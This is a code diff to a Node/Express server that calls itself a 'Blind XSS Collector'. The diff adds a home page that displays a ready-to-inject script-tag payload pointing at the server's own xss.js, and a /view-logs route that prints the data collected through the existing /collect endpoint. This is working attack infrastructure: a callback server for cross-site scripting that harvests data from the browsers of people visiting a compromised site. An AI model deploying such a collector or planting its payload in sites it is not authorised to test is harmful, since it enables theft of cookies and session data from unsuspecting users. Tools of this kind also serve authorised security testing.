@@ -76,6 +76,23 @@ app.post('/collect', (req, res) => {
   res.status(200).send('OK');
 });
 
+// ✅ Home route to avoid "Cannot GET /"
+app.get('/', (req, res) => {
+  res.send(`
+    <h2>🔍 Blind XSS Collector is Running!</h2>
+    <p>Use this payload:</p>
+    <pre>&lt;script src="https://${req.headers.host}/xss.js"&gt;&lt;/script&gt;</pre>
+    <p>Check logs at <a href="/view-logs">/view-logs</a></p>
+  `);
+});
+
+// ✅ View logs route
+app.get('/view-logs', (req, res) => {
+  const logs = fs.existsSync('logs.txt') ? fs.readFileSync('logs.txt', 'utf8') : 'No logs yet.';
+  res.setHeader('Content-Type', 'text/plain');
+  res.send(logs);
+});
+
 // Start server
 app.listen(PORT, () => {
   console.log(`✅ Server is running on port ${PORT}`);
